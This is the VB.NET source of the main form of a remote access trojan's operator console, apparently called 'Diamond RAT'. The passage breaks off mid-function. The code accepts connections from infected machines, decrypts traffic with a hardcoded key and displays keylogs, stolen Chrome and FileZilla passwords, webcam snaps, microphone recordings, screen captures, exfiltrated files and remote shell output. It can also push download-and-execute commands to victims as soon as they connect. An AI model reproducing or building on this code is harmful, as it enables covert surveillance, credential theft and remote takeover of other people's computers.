Imports System.Net.Sockets
Imports System.Net
Imports System.Text
Imports System.Threading
Imports System.Text.Encoding
Imports System.Net.NetworkInformation
Imports System.IO
Imports System.CodeDom.Compiler

Public Class Form1
    Implements IMessageFilter
    Private Declare Function DragAcceptFiles Lib "shell32.dll" (ByVal hwnd As IntPtr, ByVal accept As Boolean) As Long
    Private Declare Function DragQueryFile Lib "shell32.dll" (ByVal hdrop As IntPtr, ByVal ifile As Integer, ByVal fname As StringBuilder, ByVal fnsize As Integer) As Integer
    Private Declare Sub DragFinish Lib "Shell32.dll" (ByVal hdrop As IntPtr)
    Public Const WM_DROPFILES As Integer = 563
    Public recording As Boolean = False
    Public port As Integer = 0
    Dim listener As TcpListener
    Public listeningThread As Thread
    Public enable As Boolean = True
    Public listening As Boolean = False
    Public enckey As String = "magic_key"
    Dim frames As Long = 0
    Dim number As Integer = 1
    Dim Groups(4) As ListViewGroup
    Dim alreadygroup As Boolean = False
    Public path, oldpath, nam As String
    Public filename As String
    Dim icnpath As String
    Dim curntuser As String
    Dim compileserver As Thread
    Delegate Sub DelegateAdd(ByVal client As Connection, ByVal msg As String)
    Delegate Sub DelegateToggleListen(ByVal toggle As Boolean)
    Delegate Sub DelegateChangeText(ByVal text As String, ByVal color As System.Drawing.Color)
    Delegate Sub DelegateRemove(ByVal client As Connection)
    Delegate Sub DelegateAddSystemInformation(ByVal text As String)
    Delegate Sub DelegateAddProcess(ByVal txt As String)
    Delegate Sub DelegateAddSoftware(ByVal txt As String)
    Delegate Sub DelegateShowImage(ByVal txt As String)
    Delegate Sub DelegateListDevices(ByVal txt As String)
    Delegate Sub DelegateAddBounds(ByVal txt As String)
    Delegate Sub DelegateHostsFile(ByVal txt As String)
    Delegate Sub DelegateCPImage(ByVal txt As String)
    Delegate Sub DelegateCPText(ByVal txt As String)
    Delegate Sub DelegateShell(ByVal txt As String)
    Delegate Sub DelegateAddLogs(ByVal txt As String)
    Delegate Sub DelegatePlayandSaveAudio(ByVal txt As String)
    Delegate Sub DelegateAddPasswords(ByVal txt As String)
    Delegate Sub DelegateAddTCP(ByVal txt As String)
    Delegate Sub DelegateAddStartupEntries(ByVal txt As String)
    Delegate Sub DelegateAddDrives(ByVal txt As String)
    Delegate Sub DelegateAddFiles(ByVal txt As String)
    Delegate Sub DelegateAddWebcamDevices(ByVal txt As String)
    Delegate Sub DelegateAddThumbnail(ByVal txt As String, ByVal client As Connection)
    Delegate Sub DelegateAddWebcam(ByVal txt As String)
    Delegate Sub DelegateAddServices(ByVal txt As String)
    Sub New()
        InitializeComponent()
        Application.AddMessageFilter(Me)
        DragAcceptFiles(Me.Handle, True)
    End Sub
#Region "Connection"
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try

            cb_autolistening.Checked = My.Settings.autolistening
            cb_ShowNotification.Checked = My.Settings.ShowNotification
            cb_PlaySound.Checked = My.Settings.PlaySound
            If My.Settings.port <> 0 Then
                port = My.Settings.port
                NumericUpDown1.Value = port
                NumericUpDown2.Value = port
                Label2.Text = "Status: Idle..."
                If My.Settings.autolistening = True Then
                    listeningThread = New Thread(AddressOf Listen)
                    listeningThread.IsBackground = True
                    listeningThread.Start()
                    Invoke(New DelegateChangeText(AddressOf ChangeText), "Status: Listening...", Color.Green)
                End If
            End If


            Dim tmpHostName As String = System.Net.Dns.GetHostName()
            For i = 0 To UBound(Dns.GetHostByName(tmpHostName).AddressList())
                tb_ip.Items.Add(Dns.GetHostByName(tmpHostName).AddressList(i).ToString())
            Next
            tb_ip.Items.Add(New WebClient().DownloadString("http://xillux.com/ip.php"))
        Catch
        End Try
    End Sub
    Private Sub btn_startlistening_Click(sender As Object, e As EventArgs) Handles btn_startlistening.Click
        Try
            If listeningThread.IsAlive = True Then
                MsgBox("You are already listening on this port!", MsgBoxStyle.Critical)
                Exit Sub
            End If
1:          listeningThread = New Thread(AddressOf Listen)
            listeningThread.IsBackground = True
            listeningThread.Start()
            Invoke(New DelegateChangeText(AddressOf ChangeText), "Status: Listening...", Color.Green)
        Catch
            GoTo 1
        End Try
    End Sub
    Sub Listen()
        Try
            listener = New TcpListener(IPAddress.Any, port)
            listener.Start()
            While (True)
                Dim c As New Connection(listener.AcceptTcpClient())
                AddHandler c.GotInfo, AddressOf GotInfo
                AddHandler c.Disconnected, AddressOf Disconnected
            End While
        Catch ex As Exception
            Invoke(New DelegateToggleListen(AddressOf ToggleListen), False)
        End Try
    End Sub
    Sub ToggleListen(ByVal toggle As Boolean)
        Select Case toggle
            Case True
                listening = True
                enable = False
            Case False
                listening = False
                enable = True
        End Select
    End Sub
    Function CountryFlag(ByVal nam As String) As Integer
        Select Case nam
            Case "AFG"
                Return 2
            Case "ALB"
                Return 5
            Case "DZA"
                Return 60
            Case "ASM"
                Return 10
            Case "AND"
                Return 0
            Case "AGO"
                Return 8
            Case "AIA"
                Return 4
            Case "ATA"
                Return 60
            Case "ATG"
                Return 60
            Case "ARG"
                Return 9
            Case "ARM"
                Return 6
            Case "AUS"
                Return 12
            Case "AUT"
                Return 11
            Case "AZE"
                Return 15
            Case "BHS"
                Return 29
            Case "BHR"
                Return 22
            Case "BGD"
                Return 18
            Case "BRB"
                Return 17
            Case "BLR"
                Return 33
            Case "BLZ"
                Return 34
            Case "BEN"
                Return 24
            Case "BMU"
                Return 25
            Case "BTN"
                Return 30
            Case "BOL"
                Return 27
            Case "BIH"
                Return 16
            Case "BWA"
                Return 32
            Case "BRA"
                Return 28
            Case "IOT"
                Return 105
            Case "VBG"
                Return 235
            Case "BRN"
                Return 26
            Case "BGR"
                Return 21
            Case "BFA"
                Return 20
            Case "BDI"
                Return 24
            Case "MMR"
                Return 144
            Case "KHM"
                Return 115
            Case "CMR"
                Return 45
            Case "CAN"
                Return 35
            Case "CPV"
                Return 52
            Case "CYM"
                Return 122
            Case "CAF"
                Return 39
            Case "TCD"
                Return 212
            Case "CHL"
                Return 44
            Case "CHN"
                Return 46
            Case "CXR"
                Return 52
            Case "CCK"
                Return 37
            Case "COL"
                Return 47
            Case "COM"
                Return 117
            Case "COK"
                Return 43
            Case "CRC"
                Return 48
            Case "HRV"
                Return 98
            Case "CUB"
                Return 50
            Case "CYP"
                Return 53
            Case "CZE"
                Return 54
            Case "COD"
                Return 38
            Case "DNK"
                Return 57
            Case "DJI"
                Return 56
            Case "DMA"
                Return 58
            Case "DOM"
                Return 59
            Case "ECU"
                Return 61
            Case "EGY"
                Return 63
            Case "SLV"
                Return 207
            Case "GNQ"
                Return 88
            Case "ERI"
                Return 66
            Case "EST"
                Return 62
            Case "ETH"
                Return 68
            Case "FLK"
                Return 73
            Case "FRO"
                Return 75
            Case "FJI"
                Return 73
            Case "FIN"
                Return 71
            Case "FRA"
                Return 76
            Case "PYF"
                Return 172
            Case "GAB"
                Return 77
            Case "GMB"
                Return 85
            Case "GEO"
                Return 80
            Case "GER"
                Return 55
            Case "GHA"
                Return 82
            Case "GIB"
                Return 83
            Case "GRC"
                Return 89
            Case "GRL"
                Return 84
            Case "GRD"
                Return 79
            Case "GUM"
                Return 92
            Case "GTM"
                Return 91
            Case "GIN"
                Return 86
            Case "GNB"
                Return 93
            Case "GUY"
                Return 94
            Case "HTI"
                Return 99
            Case "VAT"
                Return 232
            Case "HND"
                Return 87
            Case "HKG"
                Return 95
            Case "HUN"
                Return 100
            Case "IS"
                Return 108
            Case "IND"
                Return 104
            Case "IDN"
                Return 101
            Case "IRN"
                Return 107
            Case "IRQ"
                Return 106
            Case "IRL"
                Return 102
            Case "IMN"
                Return 69
            Case "ISR"
                Return 103
            Case "ITA"
                Return 109
            Case "CIV"
                Return 42
            Case "JAM"
                Return 110
            Case "JPN"
                Return 112
            Case "JEY"
                Return 69
            Case "JOR"
                Return 111
            Case "KAZ"
                Return 123
            Case "KEN"
                Return 113
            Case "KIR"
                Return 116
            Case "KWT"
                Return 121
            Case "KGZ"
                Return 114
            Case "LAO"
                Return 124
            Case "LVA"
                Return 134
            Case "LBN"
                Return 125
            Case "LSO"
                Return 130
            Case "LBR"
                Return 129
            Case "LBY"
                Return 134
            Case "LIE"
                Return 127
            Case "LTU"
                Return 131
            Case "LUX"
                Return 132
            Case "MAC"
                Return 145
            Case "MKD"
                Return 141
            Case "MDG"
                Return 139
            Case "MWI"
                Return 153
            Case "MYS"
                Return 155
            Case "MDV"
                Return 152
            Case "MLI"
                Return 142
            Case "MLT"
                Return 150
            Case "MHL"
                Return 140
            Case "MRT"
                Return 148
            Case "MUS"
                Return 151
            Case "MYT"
                Return 243
            Case "MEX"
                Return 154
            Case "FSM"
                Return 74
            Case "MDA"
                Return 137
            Case "MCO"
                Return 136
            Case "MNG"
                Return 144
            Case "MNE"
                Return 138
            Case "MSR"
                Return 149
            Case "MAR"
                Return 135
            Case "MOZ"
                Return 156
            Case "NAM"
                Return 157
            Case "NRU"
                Return 166
            Case "NPL"
                Return 165
            Case "NLD"
                Return 163
            Case "ANT"
                Return 7
            Case "NCL"
                Return 158
            Case "NZL"
                Return 168
            Case "NTC"
                Return 162
            Case "NER"
                Return 159
            Case "NGA"
                Return 161
            Case "NIU"
                Return 167
            Case "PRK"
                Return 119
            Case "MNP"
                Return 146
            Case "NOR"
                Return 164
            Case "OMN"
                Return 169
            Case "PAK"
                Return 175
            Case "PLW"
                Return 182
            Case "PAN"
                Return 170
            Case "PNG"
                Return 173
            Case "PRY"
                Return 183
            Case "PER"
                Return 171
            Case "PHL"
                Return 174
            Case "PCN"
                Return 178
            Case "POL"
                Return 176
            Case "PRT"
                Return 181
            Case "PRI"
                Return 179
            Case "QAT"
                Return 184
            Case "COG"
                Return 40
            Case "ROU"
                Return 186
            Case "RUS"
                Return 188
            Case "RWA"
                Return 189
            Case "BLM"
                Return 69
            Case "SHN"
                Return 197
            Case "KNA"
                Return 118
            Case "LCA"
                Return 126
            Case "MAF"
                Return 69
            Case "SPM"
                Return 177
            Case "VCT"
                Return 233
            Case "WSM"
                Return 241
            Case "SMR"
                Return 202
            Case "STP"
                Return 206
            Case "SAU"
                Return 190
            Case "SEN"
                Return 203
            Case "SRB"
                Return 187
            Case "SYC"
                Return 192
            Case "SLE"
                Return 201
            Case "SGP"
                Return 196
            Case "SVK"
                Return 200
            Case "SVN"
                Return 199
            Case "SLB"
                Return 191
            Case "SOM"
                Return 204
            Case "ZAF"
                Return 244
            Case "KOR"
                Return 120
            Case "ESP"
                Return 67
            Case "LKA"
                Return 128
            Case "SDN"
                Return 194
            Case "SUR"
                Return 205
            Case "SJM"
                Return 199
            Case "SWZ"
                Return 209
            Case "SWE"
                Return 195
            Case "CHE"
                Return 41
            Case "SYR"
                Return 208
            Case "TWN"
                Return 224
            Case "TJK"
                Return 215
            Case "TZA"
                Return 225
            Case "THA"
                Return 214
            Case "TLS"
                Return 217
            Case "TGO"
                Return 213
            Case "TKL"
                Return 216
            Case "TON"
                Return 220
            Case "TTO"
                Return 222
            Case "TUN"
                Return 219
            Case "TUR"
                Return 221
            Case "TKM"
                Return 218
            Case "TCA"
                Return 210
            Case "TUV"
                Return 223
            Case "UGA"
                Return 227
            Case "UKR"
                Return 226
            Case "ARE"
                Return 1
            Case "GBR"
                Return 78
            Case "USA"
                Return 229
            Case "URY"
                Return 230
            Case "VIR"
                Return 236
            Case "UZB"
                Return 231
            Case "VUT"
                Return 238
            Case "VEN"
                Return 234
            Case "VNM"
                Return 237
            Case "WLF"
                Return 240
            Case "ESH"
                Return 64
            Case "YEM"
                Return 242
            Case "ZMB"
                Return 245
            Case "ZWE"
                Return 247
            Case Else
                Return 248
        End Select
    End Function
    Sub Add(ByVal client As Connection, ByVal msg As String)
        Dim ip As String = client.IPAddress

        Dim pingSender As Ping = New Ping()
        Dim reply As PingReply = pingSender.Send(ip, 3000)

        Dim l As ListViewItem
        l = New ListViewItem(msg.Split("|")(1), CountryFlag(msg.Split("|")(1)))

        For Each item As ListViewItem In ListView1.Items
            If item.Text = msg.Split("|")(1) And item.SubItems(1).Text = ip And item.SubItems(2).Text = port And item.SubItems(3).Text = msg.Split("|")(2) And item.SubItems(4).Text = msg.Split("|")(3) And item.SubItems(5).Text = msg.Split("|")(4) And item.SubItems(6).Text = msg.Split("|")(5) And item.SubItems(7).Text = msg.Split("|")(6) Then
                Exit Sub
            End If
        Next

        With l
            .SubItems.Add(ip)
            .SubItems.Add(port)
            .SubItems.Add(msg.Split("|")(2))
            .SubItems.Add(msg.Split("|")(3))
            .SubItems.Add(msg.Split("|")(4))
            .SubItems.Add(msg.Split("|")(5))
            .SubItems.Add(msg.Split("|")(6))
            .SubItems.Add(reply.RoundtripTime & "/ms")
            .Tag = client
        End With
        ListView1.Items.Add(l)

        checkonconnect(client)

        If My.Settings.ShowNotification = True Then
            If My.Settings.PlaySound = True Then
                My.Computer.Audio.Play(My.Resources.notify, AudioPlayMode.Background)
            End If
            Notify.BalloonTipIcon = ToolTipIcon.Info
            Notify.BalloonTipText = "IP: " & client.IPAddress & vbCrLf & "Username: " & msg.Split("|")(2) & vbCrLf & "Computer Name: " & msg.Split("|")(3) & vbCrLf & "Operating System: " & msg.Split("|")(4) & vbCrLf & "Version: " & msg.Split("|")(4) & vbCrLf & "Privilegs: " & msg.Split("|")(6)
            Notify.BalloonTipTitle = "Diamond RAT | New Connection!"
            Notify.Visible = True
            Notify.ShowBalloonTip(600)
        End If
    End Sub
    Sub GotInfo(ByVal client As Connection, ByVal Msg As String)
        Msg = New Encryption().AES_Decrypt(Msg, enckey)

        If Msg.StartsWith("NewConnection") Then
            Invoke(New DelegateAdd(AddressOf Add), client, Msg)
        ElseIf Msg.StartsWith("SystemInformation") Then
            Invoke(New DelegateAddSystemInformation(AddressOf AddSysteminformation), Msg)
        ElseIf Msg.StartsWith("GetProcess") Then
            Invoke(New DelegateAddProcess(AddressOf AddProcess), Msg)
        ElseIf Msg.StartsWith("Software") Then
            Invoke(New DelegateAddSoftware(AddressOf AddSoftware), Msg)
        ElseIf Msg.StartsWith("RemoteDesktop") Then
            Invoke(New DelegateShowImage(AddressOf ShowImage), Msg.Replace("RemoteDesktop", ""))
        ElseIf Msg.StartsWith("PCBounds") Then
            Invoke(New DelegateAddBounds(AddressOf AddBounds), Msg)
        ElseIf Msg.StartsWith("HostsFile") Then
            Invoke(New DelegateHostsFile(AddressOf HostsFile), Msg.Replace("HostsFile", ""))
        ElseIf Msg.StartsWith("CPImage") Then
            Invoke(New DelegateCPImage(AddressOf CPImage), Msg.Replace("CPImage", ""))
        ElseIf Msg.StartsWith("CPText") Then
            Invoke(New DelegateCPText(AddressOf CPText), Msg.Replace("CPText", ""))
        ElseIf Msg.StartsWith("Shell") Then
            Invoke(New DelegateShell(AddressOf Shell), Msg.Replace("Shell", ""))
        ElseIf Msg.StartsWith("KeyLogs") Then
            Invoke(New DelegateAddLogs(AddressOf AddLogs), Msg.Replace("KeyLogs", ""))
        ElseIf Msg.StartsWith("RecordingFile") Then
            Invoke(New DelegatePlayandSaveAudio(AddressOf PlayandSaveAudio), Msg.Replace("RecordingFile", ""))
        ElseIf Msg.StartsWith("Passwords") Then
            Invoke(New DelegateAddPasswords(AddressOf AddPasswords), Msg.Replace("Passwords", ""))
        ElseIf Msg.StartsWith("TCPConnections") Then
            Invoke(New DelegateAddTCP(AddressOf AddTCP), Msg)
        ElseIf Msg.StartsWith("Strtp") Then
            Invoke(New DelegateAddStartupEntries(AddressOf AddStartupEntries), Msg.Replace("Strtp", ""))
        ElseIf Msg.StartsWith("Drives") Then
            Invoke(New DelegateAddDrives(AddressOf AddDrives), Msg.Replace("Drives", ""))
        ElseIf Msg.StartsWith("FileManagerFiles") Then
            Invoke(New DelegateAddFiles(AddressOf AddFiles), Msg.Replace("FileManagerFiles", ""))
        ElseIf Msg.StartsWith("IncomingFile") Then
            If Not Directory.Exists(Application.StartupPath & "\DownloadedFiles") Then
                Directory.CreateDirectory(Application.StartupPath & "\DownloadedFiles")
            End If
            If Not Directory.Exists(Application.StartupPath & "\DownloadedFiles\" & curntuser) Then
                Directory.CreateDirectory(Application.StartupPath & "\DownloadedFiles\" & curntuser)
            End If
            IO.File.WriteAllBytes(Application.StartupPath & "\DownloadedFiles\" & curntuser & "\" & filename, New Encryption().DecryptBase64(Msg.Replace("IncomingFile", "")))
        ElseIf Msg.StartsWith("WebcamDevices") Then
            Invoke(New DelegateAddWebcamDevices(AddressOf AddWebcamDevices), Msg.Replace("WebcamDevices", ""))
        ElseIf Msg.StartsWith("ThumbNail") Then
            Invoke(New DelegateAddThumbnail(AddressOf AddThumbnail), Msg.Replace("ThumbNail", ""), client)
        ElseIf Msg.StartsWith("WebcamSnap") Then
            Invoke(New DelegateAddWebcam(AddressOf AddWebcam), Msg.Replace("WebcamSnap", ""))
        ElseIf Msg.StartsWith("Services") Then
            Invoke(New DelegateAddServices(AddressOf AddService), Msg.Replace("Services", ""))
        End If
    End Sub
    Sub Disconnected(ByVal client As Connection)
        Invoke(New DelegateRemove(AddressOf Remove), client)
    End Sub
    Sub Remove(ByVal client As Connection)
        For Each item As ListViewItem In ListView1.Items
            If item.SubItems(1).Text = client.IPAddress Then
                item.Remove()
                If My.Settings.ShowNotification = True Then
                    If My.Settings.PlaySound = True Then
                        My.Computer.Audio.Play(My.Resources.notify, AudioPlayMode.Background)
                    End If
                    Notify.BalloonTipIcon = ToolTipIcon.Error
                    Notify.BalloonTipText = "IP: " & item.SubItems(1).Text
                    Notify.BalloonTipTitle = "Diamond Rat | Disconnected!"
                    Notify.Visible = True
                    Notify.ShowBalloonTip(600)
                End If
                Exit For
            End If
        Next
    End Sub
    Sub SendToSelected(ByVal Message As String)
        For Each item As ListViewItem In ListView1.SelectedItems
            Try
                Dim c As Connection = DirectCast(item.Tag, Connection)
                c.Send(Message)
            Catch ex As Exception
                MsgBox(ex.Message)
            End Try
        Next
    End Sub
    Sub SendToAll(ByVal Message As String)
        For Each item As ListViewItem In ListView1.Items
            Try
                Dim c As Connection = DirectCast(item.Tag, Connection)
                c.Send(Message)
            Catch ex As Exception
                MsgBox(ex.Message)
            End Try
        Next
    End Sub
    Sub ChangeText(ByVal text As String, ByVal color As System.Drawing.Color)
        Label2.Text = text
        Label2.ForeColor = color
    End Sub
    Private Sub btn_stoplistening_Click(sender As Object, e As EventArgs) Handles btn_stoplistening.Click
        If listeningThread.IsAlive = True Then
            SendToAll(New Encryption().AES_Encrypt("Disconnected", enckey))
            listener.Server.Close()
            listeningThread.Abort()
            Invoke(New DelegateToggleListen(AddressOf ToggleListen), False)
            Invoke(New DelegateChangeText(AddressOf ChangeText), "Status: Idle...", Color.Black)
            ListView1.Items.Clear()
        End If
    End Sub
    Private Sub NumericUpDown1_ValueChanged(sender As Object, e As EventArgs) Handles NumericUpDown1.ValueChanged
        port = NumericUpDown1.Value
        My.Settings.port = NumericUpDown1.Value
        My.Settings.Save()
    End Sub
    Sub checkonconnect(ByVal client As Connection)
        For Each item As ListViewItem In ListViewOnConnect.Items
            If item.Text = "Open Website" And item.SubItems(2).Text = "Enabled" Then
                client.Send(New Encryption().AES_Encrypt("OpenWebsite" & item.SubItems(1).Text, enckey))
            ElseIf item.Text = "Download & Execute" And item.SubItems(2).Text = "Enabled" Then
                client.Send(New Encryption().AES_Encrypt("DandE" & item.SubItems(1).Text, enckey))
            ElseIf item.Text = "Show MessageBox" And item.SubItems(2).Text = "Enabled" Then
                client.Send(New Encryption().AES_Encrypt("MSG" & item.SubItems(1).Text, enckey))
            End If
        Next
    End Sub
#Region "Settings"
    Private Sub cb_autolistening_CheckedChanged(sender As Object, e As EventArgs) Handles cb_autolistening.CheckedChanged
        If cb_autolistening.Checked Then
            My.Settings.autolistening = True
        Else
            My.Settings.autolistening = False
        End If
    End Sub
    Private Sub cb_ShowNotification_CheckedChanged(sender As Object, e As EventArgs) Handles cb_ShowNotification.CheckedChanged
        If cb_ShowNotification.Checked Then
            My.Settings.ShowNotification = True
        Else
            My.Settings.ShowNotification = False
        End If
    End Sub
    Private Sub cb_PlaySound_CheckedChanged(sender As Object, e As EventArgs) Handles cb_PlaySound.CheckedChanged
        If cb_PlaySound.Checked Then
            My.Settings.PlaySound = True
        Else
            My.Settings.PlaySound = False
        End If
    End Sub
#End Region
#End Region
#Region "Others"
#Region "Group By"
    Public Sub GroupListView(ByVal lstV As ListView, ByVal SubItemIndex As Int16)
        Try
            Dim flag As Boolean = True
            For Each l As ListViewItem In lstV.Items
                Dim strmyGroupname As String = l.SubItems(SubItemIndex).Text
                For Each lvg As ListViewGroup In lstV.Groups
                    If lvg.Name = strmyGroupname Then
                        l.Group = lvg
                        flag = False
                    End If
                Next
                If flag = True Then
                    Dim lstGrp As New ListViewGroup(strmyGroupname, strmyGroupname)
                    lstV.Groups.Add(lstGrp)
                    l.Group = lstGrp
                End If
                flag = True
            Next
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub
    Private Sub CountryToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CountryToolStripMenuItem.Click
        GroupListView(ListView1, 0)
    End Sub
    Private Sub OperatingSystemToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OperatingSystemToolStripMenuItem.Click
        GroupListView(ListView1, 5)
    End Sub
    Private Sub PrivilegsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PrivilegsToolStripMenuItem.Click
        GroupListView(ListView1, 7)
    End Sub
#End Region
    Public Function CountCharacter(ByVal value As String, ByVal ch As Char) As Integer
        Dim cnt As Integer = 0
        For Each c As Char In value
            If c = ch Then cnt += 1
        Next
        Return cnt
    End Function
    Sub AddSysteminformation(ByVal text As String)
        SystemInformation.TreeView1.Nodes(0).Nodes(0).Text = "Computer Name: " & text.Split("|")(1)
        SystemInformation.TreeView1.Nodes(0).Nodes(1).Text = "User Name: " & text.Split("|")(2)
        SystemInformation.TreeView1.Nodes(0).Nodes(2).Text = "Virtual Screen Width: " & text.Split("|")(3)
        SystemInformation.TreeView1.Nodes(0).Nodes(3).Text = "Virtual Screen Height: " & text.Split("|")(4)
        SystemInformation.TreeView1.Nodes(0).Nodes(4).Text = "Available Physical Memory: " & text.Split("|")(5)
        SystemInformation.TreeView1.Nodes(0).Nodes(5).Text = "Available Virtual Memory: " & text.Split("|")(6)
        SystemInformation.TreeView1.Nodes(0).Nodes(6).Text = "OS Full Name: " & text.Split("|")(7)
        SystemInformation.TreeView1.Nodes(0).Nodes(7).Text = "OS Platform: " & text.Split("|")(8)
        SystemInformation.TreeView1.Nodes(0).Nodes(8).Text = "OS Version: " & text.Split("|")(9)
        SystemInformation.TreeView1.Nodes(0).Nodes(9).Text = "Total Physical Memory: " & text.Split("|")(10)
        SystemInformation.TreeView1.Nodes(0).Nodes(10).Text = "Total Virtual Memory: " & text.Split("|")(11)
        SystemInformation.TreeView1.Nodes(0).Nodes(11).Text = "Battery Charge Status: " & text.Split("|")(12)
        SystemInformation.TreeView1.Nodes(0).Nodes(12).Text = "Battery Full Lifetime: " & text.Split("|")(13)
        SystemInformation.TreeView1.Nodes(0).Nodes(13).Text = "Battery Life Percent: " & text.Split("|")(14)
        SystemInformation.TreeView1.Nodes(0).Nodes(14).Text = "Battery Life Remaining: " & text.Split("|")(15)
        SystemInformation.TreeView1.Nodes(0).Nodes(15).Text = "CPU Info: " & text.Split("|")(16)
        SystemInformation.TreeView1.Nodes(0).Nodes(16).Text = "GPU Name: " & text.Split("|")(17)
        SystemInformation.TreeView1.Nodes(0).Nodes(17).Text = "Uptime: " & text.Split("|")(18)

        SystemInformation.TreeView1.Nodes(1).Nodes(0).Text = "Registered Owner: " & text.Split("|")(19)
        SystemInformation.TreeView1.Nodes(1).Nodes(1).Text = "Registered Organization: " & text.Split("|")(20)
        SystemInformation.TreeView1.Nodes(1).Nodes(2).Text = "Product Key: " & text.Split("|")(21)

        Dim s As String = text.Split("|")(22)
        For i = 2 To s.Length + 2 Step 3
            s = s.Insert(i, ":")
        Next

        SystemInformation.TreeView1.Nodes(1).Nodes(3).Text = "MAC Adress: " & s
        SystemInformation.TreeView1.Nodes(1).Nodes(4).Text = "Webcam Available: " & text.Split("|")(23)
        SystemInformation.TreeView1.Nodes(1).Nodes(5).Text = "Installed AntiVirus Engine: " & text.Split("|")(24)
        SystemInformation.TreeView1.Nodes(1).Nodes(6).Text = "Server Location: " & text.Split("|")(25)
    End Sub
    Sub AddProcess(ByVal txt As String)
        Try
            Dim ItemLines As New TextBox
            ItemLines.Text = txt.Replace("GetProcess", "")
            SystemInformation.listprocess.Items.Clear()
            For Each line As String In ItemLines.Lines
                Dim text() As String = line.Split("|")

                Dim ItemName As String = text(0)
                Dim SubItem1 As String = text(1)
                Dim SubItem2 As String = text(2)
                Dim SubItem3 As String = text(3)
                Dim SubItem4 As String = text(4)

                Dim Item As New ListViewItem(ItemName)

                Item.SubItems.Add(SubItem1)
                Item.SubItems.Add(SubItem2)
                Item.SubItems.Add(SubItem3)
                Item.SubItems.Add(SubItem4)

                SystemInformation.listprocess.Items.AddRange(New ListViewItem() {Item})
            Next
            SystemInformation.Label1.Text = "Total Processes: " & SystemInformation.listprocess.Items.Count
        Catch
        End Try
    End Sub
    Sub AddSoftware(ByVal txt As String)
        SystemInformation.ListBox_Software.Items.Clear()
        txt = txt.Replace(txt.Split("|")(0) & "|", "")

        SystemInformation.Label2.Text = "Installed Software: " & txt.Split("|")(0)

        txt = txt.Replace(txt.Split("|")(0) & "|", "")

        For i = 0 To CountCharacter(txt, "|")
            SystemInformation.ListBox_Software.Items.Add(txt.Split("|")(i))
        Next

    End Sub
    Sub ShowImage(ByVal txt As String)
        Dim b() As Byte = New Encryption().DecryptBase64(txt)
        RemoteDesktop.PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage
        RemoteDesktop.first = False
        RemoteDesktop.PictureBox1.Image = ByteArray2Image(b)
        frames += 1
        RemoteDesktop.FramesReceivedToolStripMenuItem.Text = "Frames Received: " & frames
        RemoteDesktop.remotecontrol = True
        RemoteDesktop.StartToolStripMenuItem.PerformClick()
    End Sub
    Public Function ByteArray2Image(ByVal ByAr() As Byte) As Image
        Dim img As Image
        Dim MS As New IO.MemoryStream(ByAr)
        Try
            img = Image.FromStream(MS)
        Catch ex As Exception
            Return Nothing
        End Try

        Return img
    End Function
    Sub AddBounds(ByVal txt As String)
        RemoteDesktop.pcheight = txt.Replace("PCBounds", "").Split("x")(0)
        RemoteDesktop.pcwidth = txt.Replace("PCBounds", "").Split("x")(1)
    End Sub
    Sub AddLogs(ByVal txt As String)
        Keylogger.RichTextBox1.Text = txt
    End Sub
    Sub PlayandSaveAudio(ByVal txt As String)
        Dim name As String = txt.Split("|")(0)
        txt = txt.Replace(txt.Split("|")(0) & "|", "")

        Dim b() As Byte = New Encryption().DecryptBase64(txt)

        If Not File.Exists(Application.StartupPath & "\Audio_Files\") Then
            My.Computer.FileSystem.CreateDirectory(Application.StartupPath & "\Audio_Files\")
        End If

        File.WriteAllBytes(Application.StartupPath & "\Audio_Files\" & name & "_" & number & ".wav", b)

        Audio.Label2.Text = "Playing..."
        Audio.PictureBox2.Image = My.Resources.play
        My.Computer.Audio.Play(Application.StartupPath & "\Audio_Files\" & name & "_" & number & ".wav", AudioPlayMode.Background)
        number += 1
    End Sub
    Sub AddPasswords(ByVal txt As String)
        paswdrec.ListView1.Items.Clear()
        Try
            Dim ItemLines As New TextBox
            ItemLines.Text = txt
            For Each line As String In ItemLines.Lines
                Dim text() As String = line.Split("|")

                Dim ItemName As String = text(0)
                Dim SubItem1 As String = text(1)
                Dim SubItem2 As String = text(2)
                Dim SubItem3 As String = text(3)

                If SubItem1 = "Chrome" Then
                    Dim Item As New ListViewItem(ItemName, 0)

                    Item.SubItems.Add(SubItem1)
                    Item.SubItems.Add(SubItem2)
                    Item.SubItems.Add(SubItem3)

                    paswdrec.ListView1.Items.AddRange(New ListViewItem() {Item})
                ElseIf SubItem1 = "FileZilla" Then
                    Dim Item As New ListViewItem(ItemName, 1)

                    Item.SubItems.Add(SubItem1)
                    Item.SubItems.Add(SubItem2)
                    Item.SubItems.Add(SubItem3)

                    paswdrec.ListView1.Items.AddRange(New ListViewItem() {Item})
                End If
            Next
        Catch
        End Try
    End Sub
    Sub AddTCP(ByVal txt As String)
        SystemInformation.ListView_tcp.Items.Clear()
        Try
            Dim ItemLines As New TextBox
            ItemLines.Text = txt.Replace("TCPConnections", "")
            For Each line As String In ItemLines.Lines
                Dim text() As String = line.Split("|")

                Dim ItemName As String = "TCP"
                Dim SubItem1 As String = text(0)
                Dim SubItem2 As String = text(1)
                Dim Subitem3 As String = text(2)

                Dim Item As New ListViewItem(ItemName)

                Item.SubItems.Add(SubItem1)
                Item.SubItems.Add(SubItem2)
                Item.SubItems.Add(Subitem3)

                SystemInformation.ListView_tcp.Items.AddRange(New ListViewItem() {Item})
            Next
        Catch
        End Try
    End Sub
    Sub AddStartupEntries(ByVal txt As String)
        My.Computer.Clipboard.SetText(txt)
        SystemInformation.ListView_Startup.Items.Clear()
        Groups(0) = New ListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", HorizontalAlignment.Left)
        Groups(1) = New ListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce", HorizontalAlignment.Left)
        Groups(2) = New ListViewGroup("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", HorizontalAlignment.Left)
        Groups(3) = New ListViewGroup("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce", HorizontalAlignment.Left)

        For i = 0 To 3
            SystemInformation.ListView_Startup.Groups.Add(Groups(i))
        Next

        Dim x As New TextBox
        x.Text = txt
        For Each line As String In x.Lines
            Dim lw = New ListViewItem(line.Split("|")(1))
